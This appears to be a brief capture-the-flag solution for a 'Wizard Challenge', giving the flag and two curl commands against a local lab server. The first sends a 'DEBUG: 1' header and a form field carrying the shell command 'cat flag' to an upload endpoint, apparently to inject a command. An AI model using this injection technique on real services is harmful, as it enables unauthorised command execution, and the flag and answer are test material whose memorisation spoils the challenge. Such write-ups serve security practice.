# Wizard Challenge

 __Points: 100__ </br>
 __FLAG{bagsanddoublebags}__

  Solution:
  1. curl -X POST --header "DEBUG: 1" --data "blog_post=cat%20flag" "localhost:7003/upload"
  2. curl "localhost:7003"
